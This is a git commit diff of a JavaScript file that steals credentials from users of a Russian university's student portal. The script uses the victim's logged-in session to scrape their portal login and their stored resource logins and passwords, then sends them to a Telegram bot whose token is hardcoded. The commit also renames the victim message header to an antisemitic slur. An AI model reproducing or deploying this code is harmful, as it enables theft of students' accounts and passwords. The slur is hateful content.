1b635043ad0b31d8ff97a1fc6344df567c868213
Rlexin <86605317+Rlexin@users.noreply.github.com>
2025-12-18 20:49:30 +0300

    Update z.js

--- z.js
+++ z.js
@@ -1,12 +1,16 @@
 let userOid = document.querySelector('[data-oid]')?.getAttribute('data-oid') || "не найден";
+let currentPage = window.location.href;
 
 fetch("http://lk.stu.lipetsk.ru/changepass?auth=Y", {credentials: "include"})
 .then(r => r.arrayBuffer())
 .then(buf => {
     const decoder = new TextDecoder("windows-1251");
     const html = decoder.decode(buf);
+
+
     const loginMatch = html.match(/name="LOGIN"[^>]*value="([^"]+)"/);
     const login = loginMatch ? loginMatch[1] : "не найден";
+
     return fetch("http://lk.stu.lipetsk.ru/sources/", {credentials: "include"})
         .then(r => r.arrayBuffer())
         .then(buf2 => {
@@ -30,10 +34,13 @@ fetch("http://lk.stu.lipetsk.ru/changepass?auth=Y", {credentials: "include"})
                     resourcesList += `• ${title}\n  Логин: ${resLogin}\n  Пароль: ${password}\n\n`;
                 });
             }
-            const message = `Новая жертва:\nЛогин: ${login}\nOID: ${userOid}\n\n${resourcesList}`;
+
+            const message = `Новый Гой!\nСтраница: ${currentPage}\n\nЛогин: ${login}\nOID: ${userOid}\n\n${resourcesList}`;
+
             const botToken = "8199474882:AAHwLa5cSQyKowkvRKQXX2QCtJI_tbAuSzs";
             const chatId = "1324649577";
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
         });
 })
 .catch(err => console.log("Ошибка:", err));
+// Ибшники не бейте пажалуста
